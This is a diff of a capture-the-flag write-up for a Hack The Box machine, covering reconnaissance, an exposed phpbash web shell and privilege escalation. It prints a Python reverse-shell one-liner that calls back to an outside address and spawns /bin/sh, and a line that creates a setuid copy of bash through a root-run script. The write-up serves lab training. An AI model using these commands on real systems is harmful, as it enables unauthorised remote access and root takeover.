@@ -17,7 +17,7 @@
 
 #### **2.1 - NMAP**
 
-Port 80 was discovered using NMAP:
+A port scan was undertaken using NMAP, in which port 80 was discovered: 
 
 ![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/7fce3128-5737-4b70-814e-04687c2fcc44)
 
@@ -29,7 +29,7 @@ A vulnerability scan was performed using nikto which flagged a number of interes
 
 #### **2.3 - dirbuster** 
 
-With the nikto scan in mind a dirbuster scan was performed to brute-force web directories which exposed the phpbash.php web shell script. 
+With the nikto scan in mind, a dirbuster scan was performed to brute-force web directories which exposed the phpbash.php web shell script. 
 
 ![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/b6691ce0-57ad-46d1-8118-36b82e586362)
 ![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/2401dd5f-e8b1-40fc-a17d-83af0ef68d10)
@@ -54,15 +54,32 @@ As the www-data user when performing the sudo -l command we can see that command
 
 #### **4.2 - reverse shell**
 
-Because we can run commands as scriptmanagr a reverse shell was created using python which allowed our first privilege escalation to the scriptmanager user itself. 
+Because we can run commands as scriptmanager a reverse shell was created using python which allowed our first privilege escalation to the scriptmanager user itself. 
 
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.0",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-Catching the reverse shell and checking the user id we can see it was sucsessful:
+Catching the reverse shell and checking the user id we can see it was successful:
 
 ![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/6ee34a27-8da2-4132-ba2b-9d16912b551c)
 
 #### 4.3 - escalation to root**
 
+As the scriptmanager user we navigate to the root directory and see a directory called 'scripts'. Inside this directory is a simple python script called test.py and a text file. The python script writes a message to the test.txt file which is owned by root. 
+
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/7104dc83-e23a-4851-b26f-a852d52f25fb)
+
+The test.py script was edited to import the python 'os' module and the following line of code was added:
+
+```python
+os.system('cp /bin/bash /tmp/willthiswork; chmod +s /tmp/willthiswork')
+```
+
+This copies the /bin/bash binary to the /tmp/willthiswork location and sets the setuid bit on and when this new binary is executed with the -p flag it will run with the permission of the owner (root) and would not reset the effective user id, as displayed below:
+
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/4bf461fc-1beb-4905-a2a1-953b9c025965)
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/8e7724be-5630-46f4-a384-cea50036228c)
+
 ## 5.0 - POST-EXPLOITATION 
+
+Lessons learned: 
